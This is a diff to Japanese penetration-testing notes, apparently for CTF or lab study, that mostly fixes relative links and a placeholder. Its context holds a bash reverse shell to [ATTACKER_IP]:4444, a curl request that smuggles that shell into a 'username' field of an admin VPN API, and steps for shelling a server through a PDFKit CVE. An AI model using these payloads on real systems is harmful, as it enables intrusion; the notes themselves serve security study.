@@ -96,7 +96,7 @@ bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1'
 curl -X POST http://[TARGET]/api/v1/admin/vpn/generate \
   -H "Cookie: PHPSESSID=<セッション>" \
   -H "Content-Type: application/json" \
-  -d '{"username": "test; bash -c '"'"'bash -i >& /dev/tcp/<attacker ip>/4444 0>&1'"'"'"}'
+  -d '{"username": "test; bash -c '"'"'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1'"'"'"}'
 ```
 
 `'"'"'` の分解：
@@ -169,11 +169,11 @@ searchsploit [ライブラリ名] [バージョン]
 ### 手順概要（ペイロード全文は CVE_Notes.md を参照）
 
 1. ライブラリ名・バージョンを特定（exiftool / レスポンスヘッダー）
-2. searchsploit → CVE 番号を確認 → `../../../05_Tools_Reference/CVE_Notes.md` でペイロードを確認
+2. searchsploit → CVE 番号を確認 → `../../05_Tools_Reference/CVE_Notes.md` でペイロードを確認
 3. nc リスナーと HTTP サーバー（シェルスクリプト配信用）を起動
 4. URL フォームにペイロードを送信してシェルを取得
 
-> 具体的なペイロード・事前準備手順（PDFKit CVE-2022-25765 の curl コマンド・rev.sh テンプレート）→ `../../../05_Tools_Reference/CVE_Notes.md`
+> 具体的なペイロード・事前準備手順（PDFKit CVE-2022-25765 の curl コマンド・rev.sh テンプレート）→ `../../05_Tools_Reference/CVE_Notes.md`
 
 ### 刺さらなかったとき
 - バックティックが無効 → `$(command)` ドル記法を試す
@@ -189,5 +189,5 @@ searchsploit [ライブラリ名] [バージョン]
 - 前：URL を入力できるフォームの発見 → `../../01_Reconnaissance/Web_Enumeration.md`
 - 後：シェル安定化 → `../../03_Post_Access_Linux/Shell_Stabilization.md`
 - 後：侵入後の認証情報探索 → `../../02_Initial_Access/Credential_Discovery.md`（`.bundle/config` 等）
-- CVE ペイロード詳細 → `../../../05_Tools_Reference/CVE_Notes.md`
+- CVE ペイロード詳細 → `../../05_Tools_Reference/CVE_Notes.md`
 - SSRF との切り替え → `SSRF.md`
